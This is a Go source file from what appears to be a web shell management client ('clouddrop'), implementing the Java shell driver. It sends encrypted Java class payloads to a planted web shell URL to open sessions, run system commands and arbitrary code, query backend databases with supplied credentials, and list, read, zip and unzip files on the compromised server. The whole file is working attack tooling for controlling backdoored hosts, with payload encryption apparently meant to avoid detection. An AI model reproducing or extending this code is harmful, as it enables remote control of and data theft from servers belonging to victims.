package service

import (
	"clouddrop/pkg/util"
	"log"
	"strings"
)

var JavaSessions map[int]string

func (s *JavaShell) GetShellType() string {
	return "java"
}

func (s *JavaShell) FreshSession(id int, shellURL string, password string) (string, error) {
	if JavaSessions == nil {
		JavaSessions = make(map[int]string)
	}

	dynamicPassword := util.GeneratePasswordSeed()
	code, err := readPayload("java", "Check.class")
	if err != nil {
		return "", err
	}
	enCode := util.EncryptWithOffset(code, dynamicPassword, util.RequestOffsetForShell(s.GetShellType()))

	JavaSessions[id], err = util.PostRequestWithoutSession(shellURL, dynamicPassword, enCode)
	if err != nil {
		return "", err
	}
	log.Println("当前Java会话 " + JavaSessions[id])

	enResult, err := util.PostRequest(shellURL, dynamicPassword, enCode, JavaSessions[id], s.GetShellType())
	if err != nil {
		return "", err
	}
	res, err := util.DecryptWithOffset(strings.TrimSpace(enResult), dynamicPassword, 5)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(res), nil
}

func (s *JavaShell) hook(id int, shellURL, password, payloadName string, params map[string]string) (string, error) {
	code, err := readPayload("java", payloadName+".class")
	if err != nil {
		return "", err
	}
	return util.HookPostWithOptions(shellURL, password, code, JavaSessions[id], s.GetShellType(), encodeParamsHeader(params))
}

func (s *JavaShell) BaseInfo(id int, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "BaseInfo", nil)
}

func (s *JavaShell) ExecCommand(id int, command string, shellURL string, password string) (string, error) {
	osType, _ := s.hook(id, shellURL, password, "OS", nil)
	return s.hook(id, shellURL, password, "CMD", map[string]string{
		"cmdPath": chooseWindowsCmd(osType),
		"exit":    "true",
		"cmd":     command,
	})
}

func (s *JavaShell) ExecCode(id int, code string, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "ExecCode", map[string]string{"code": code})
}

func (s *JavaShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, shellURL, password string) (string, error) {
	return s.hook(id, shellURL, password, "DataBase", map[string]string{
		"driver":   driver,
		"host":     host,
		"port":     port,
		"user":     user,
		"pass":     pass,
		"database": database,
		"sql":      sql,
		"option":   option,
		"encoding": encoding,
	})
}

func (s *JavaShell) FileZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "FileZip", map[string]string{"srcPath": srcPath, "toPath": toPath})
}

func (s *JavaShell) FileUnZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "FileUnZip", map[string]string{"srcPath": srcPath, "toPath": toPath})
}

func (s *JavaShell) FileList(id int, path string, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "FileList", map[string]string{"path": path})
}

func (s *JavaShell) FileShow(id int, path string, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "FileShow", map[string]string{"path": path})
}
